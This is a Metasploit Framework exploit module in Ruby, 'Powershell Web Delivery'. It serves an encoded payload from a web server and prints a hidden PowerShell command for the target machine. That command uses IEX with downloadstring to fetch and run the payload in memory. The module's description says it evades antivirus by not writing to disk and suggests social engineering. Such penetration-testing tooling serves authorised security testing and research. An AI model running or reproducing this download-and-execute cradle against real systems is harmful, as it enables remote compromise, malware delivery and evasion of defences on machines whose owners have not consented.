##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'		 => 'Powershell Web Delivery',
			'Description'	 => %q{
				Quickly fires up a web server that serves the payload in powershell.
				The command will start powershell and then download and execute the payload.
				You can extract the IEX command to execute directly from powershell.
				The main goal of this module is	that a session can be quickly established
				on a target machine when you have to manually type in the command yourself,
				e.g. RDP Session, Local Access or maybe Remote Command Exec.
				This does not write to disk so is unlikely to trigger AV solutions and will
				allow you to attempt local privilege escalations supplied by meterpreter etc.
				You could also try your luck with social engineering.
				Ensure your payload architecture matches the target computer or use SYSWOW64
				powershell.exe to execute x86 payloads on x64 machines.
			},
			'License'	 => MSF_LICENSE,
			'Author'	 =>
				[
					'Ben Campbell <eat_meatballs[at]hotmail.co.uk>',
					'Chris Campbell' #@obscuresec - Inspiration n.b. no relation!
				],
			'References'	 =>
				[
					[ 'URL', 'http://www.pentestgeek.com/2013/07/19/invoke-shellcode/' ]
				],
			'Platform'	 => 'win',
			'Targets'	 =>
				[
					[ 'Windows x86', { 'Arch' => ARCH_X86 } ],
					[ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jul 19 2013'))
	end

	def on_request_uri(cli, request)
		print_status("Delivering Payload")
		data = Msf::Util::EXE.to_win32pe_psh_net(framework, payload.encoded)
		send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
	end

	def primer
		url = get_uri()
		download_and_run = "IEX ((new-object net.webclient).downloadstring('#{url}'))"
		print_status("Run the following command on the target machine:")
		print_line("powershell.exe -windowstyle hidden -noexit -NoProfile -ExecutionPolicy unrestricted -command \"#{download_and_run}\"")
	end
end

